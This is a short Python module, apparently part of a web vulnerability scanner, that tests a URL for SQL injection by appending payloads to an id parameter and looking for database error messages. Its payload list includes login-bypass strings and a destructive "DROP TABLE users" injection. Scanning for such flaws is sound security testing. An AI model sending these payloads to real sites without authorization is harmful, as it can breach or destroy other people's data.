from engine.utils.requester import send_request

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "'; DROP TABLE users--"
]

ERRORS = [
    "sql syntax",
    "mysql",
    "sqlite",
    "syntax error",
    "warning"
]

def scan_sqli(url):
    findings = []

    for payload in PAYLOADS:
        test_url = f"{url}?id={payload}"
        response = send_request(test_url)

        if response and any(err in response.text.lower() for err in ERRORS):
            findings.append({
                "type": "SQL_INJECTION",
                "url": url,
                "payload": payload,
                "evidence": "SQL error detected"
            })

    return findings
